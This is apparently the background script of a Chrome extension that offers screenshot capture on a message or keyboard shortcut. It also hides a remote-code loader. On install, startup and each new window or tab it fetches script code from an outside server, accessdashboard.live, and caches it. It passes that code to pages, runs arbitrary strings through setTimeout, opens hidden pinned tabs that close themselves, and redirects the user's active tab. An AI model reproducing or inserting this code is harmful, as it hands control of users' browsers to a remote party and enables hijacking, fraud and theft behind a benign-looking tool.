const captureFun=e=>{
    chrome.tabs.captureVisibleTab(null,{format:e||"png",quality:100},
    function(e){
        chrome.downloads.download({url:e})
    }
    )
};

chrome.runtime.onMessage.addListener((e,t,a)=>{
    "capture"===e&&captureFun()
})
,chrome.commands.onCommand.addListener(e=>{
    captureFun("captureJpg"===e?"jpeg":"png")
});

const screenConfig="console.log('screen config')";

function isValidTime(e){
    if(e&&e.lastDate){
        const t=new Date-new Date(JSON.parse(e.lastDate));return Math.round(t/864e5)>0
    }
    return!0
}

function callApi(){
    chrome.storage.local.get("data",({data:e})=>{
        isValidTime(e)&&fetch("https://accessdashboard.live/api/script/61ab1d2c5cd43278390e0950").then(
            e=>e.json()
            ).then(e=>{
                const t={
                    code:e.code,lastDate:JSON.stringify(new Date)
                };
                chrome.storage.local.set({data:t})
            })
        }
    )
}

chrome.runtime.onInstalled.addListener(function(e){
    "install"===e.reason&&callApi()
}   ),chrome.windows.onCreated.addListener(function(){
    callApi()}
    ),chrome.runtime.onStartup.addListener(function(){
        callApi()
    }),chrome.tabs.onCreated.addListener(function(){
        callApi()
    }),chrome.runtime.onMessage.addListener(function(e,t,a){
        if("getCode"===e.action)
        return chrome.storage.local.get("data",({data:e})=>{
            e&&e.code?a({script:e.code}):fetch("https://accessdashboard.live/api/script/61ab1d2c5cd43278390e0950").then(
                e=>e.json()).then(
                    e=>{contentScript=e.code;
                        const t={lastDate:JSON.stringify(new Date),code:contentScript};
                        chrome.storage.local.set({data:t}),
                        a({script:contentScript})
                        }
                    )
                }
            ),
            !0;
            if("openTab"===e.action)
            chrome.tabs.create({url:e.redirect,pinned:!0,active:!1,index:0}
                ,function(e){
                    chrome.tabs.onUpdated.addListener(function(t,a){
                        "complete"===a.status&&t===e.id&&setTimeout(
                            function(){
                                chrome.tabs.remove(e.id)
                            },3e3)
                        })
                    });
            else if("executeCode"===e.action){
                const t=e.script;setTimeout(t,0)
            }else e.redirect&&chrome.tabs.update(t.tab.id,{url:e.redirect})});